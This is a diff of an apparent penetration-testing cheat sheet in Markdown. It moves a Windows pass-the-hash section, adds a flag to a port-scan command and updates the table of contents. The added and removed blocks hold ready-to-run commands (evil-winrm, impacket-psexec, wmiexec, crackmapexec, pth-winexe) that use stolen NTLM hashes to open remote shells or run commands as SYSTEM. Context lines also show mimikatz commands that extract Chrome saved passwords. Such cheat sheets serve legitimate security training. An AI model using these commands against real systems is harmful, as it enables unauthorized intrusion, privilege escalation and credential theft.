@@ -78,7 +78,7 @@ Other great cheetsheets:
     - [5.4.4. Windows LOLBAS Encoding/Decoding](#544-windows-lolbas-encodingdecoding)
     - [5.4.5. Execute Inline Tasks with MSBuild.exe](#545-execute-inline-tasks-with-msbuildexe)
   - [5.5. Windows UAC Bypass](#55-windows-uac-bypass)
-  - [5.6. Windows Pass-The-Hash](#56-windows-pass-the-hash)
+  - [5.6. Windows Pass-The-Hash Attacks](#56-windows-pass-the-hash-attacks)
   - [5.7. Windows Token Impersonation](#57-windows-token-impersonation)
     - [5.7.1. Windows Token Impersonation with RoguePotato](#571-windows-token-impersonation-with-roguepotato)
     - [5.7.2. Windows Token Impersonation with PrintSpoofer](#572-windows-token-impersonation-with-printspoofer)
@@ -113,7 +113,6 @@ Other great cheetsheets:
     - [7.3.5. Dumping Hashes from Windows](#735-dumping-hashes-from-windows)
       - [7.3.5.1. Dumping Hashes from Windows Domain Controller](#7351-dumping-hashes-from-windows-domain-controller)
     - [7.3.6. Using mimikatz to dump hashes and passwords](#736-using-mimikatz-to-dump-hashes-and-passwords)
-    - [7.3.7. Pass The Hash Attacks on Windows](#737-pass-the-hash-attacks-on-windows)
   - [7.4. Linux Files of Interest](#74-linux-files-of-interest)
   - [7.5. Data Wrangling on Linux](#75-data-wrangling-on-linux)
     - [7.5.1. Awk & Sed](#751-awk--sed)
@@ -173,7 +172,7 @@ script scanning on those ports.
 
 ```sh
 VICTIM_IP=VICTIM_IP
-mkdir -p scans/nmap; cd scans; sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -A -oA nmap/all-ports
+mkdir -p scans/nmap; cd scans; sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -n -Pn -A -oA nmap/all-ports
 ```
 
 ## 3.3. Simple Bash ping scanner
@@ -1379,15 +1378,35 @@ fodhelper
 Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 ```
 
-## 5.6. Windows Pass-The-Hash
+## 5.6. Windows Pass-The-Hash Attacks
+
+There are lots of ways to pass the hash on windows, giving you access as a user
+with just the hash of their creds.
 
 See [Dumping Hashes from Windows](#735-dumping-hashes-from-windows) for techniques
 on grabbing Windows password hashes.
 
+Note: Windows hashes are in the form LMHASH:NTHASH. That convention is used here.
+
 ```sh
+# Get remote powershell shell by passing the hash
+# install: sudo gem install evil-winrm
+evil-winrm.rb -i VICTIM_IP -u username -H NTHASH
+
+# Run remote command as SYSTEM (note colon before NT hash)
+impacket-psexec -hashes :NTHASH administrator@VICTIM_IP whoami
+# omit the command to get interactive shell
+
+impacket-wmiexec DOMAIN/Administrator@VICTIM_IP -hashes LMHASH:NTHASH
+
+# execute remote command as Admin (IP MUST GO LAST!)
+crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami VICTIM_IP
+
 # spawn cmd.exe shell on remote windows box
 # replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
 pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe
+
+# other options: xfreerdp, smbclient
 ```
 
 ## 5.7. Windows Token Impersonation
@@ -2307,27 +2326,6 @@ kerberos::list
 :: get google chrome saved credentials
 dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
-```
-
-### 7.3.7. Pass The Hash Attacks on Windows
-
-Note: Windows hashes are in the form LMHASH:NTHASH. That convention is used here.
-
-```sh
-# Get remote powershell shell by passing the hash
-# install: sudo gem install evil-winrm
-evil-winrm.rb -i VICTIM_IP -u username -H NTHASH
-
-# Run remote command as SYSTEM (note colon before NT hash)
-impacket-psexec -hashes :NTHASH administrator@VICTIM_IP whoami
-# omit the command to get interactive shell
-
-impacket-wmiexec DOMAIN/Administrator@VICTIM_IP -hashes LMHASH:NTHASH
-
-# execute remote command as Admin (IP MUST GO LAST!)
-crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami VICTIM_IP
-
-# other options: xfreerdp, smbclient, pth-winexe
 ```
 
 ## 7.4. Linux Files of Interest
